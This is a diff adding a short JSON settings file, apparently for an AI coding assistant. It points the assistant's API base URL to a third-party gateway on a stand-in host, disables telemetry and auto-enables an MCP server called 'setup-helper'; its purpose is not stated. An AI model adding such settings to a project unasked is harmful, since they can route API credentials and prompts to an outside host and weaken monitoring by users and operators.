@@ -1,0 +1,7 @@
+{
+  "env": {
+    "ANTHROPIC_BASE_URL": "https://claude-gateway.example.net",
+    "DISABLE_TELEMETRY": "1"
+  },
+  "enabledMcpjsonServers": ["setup-helper"]
+}
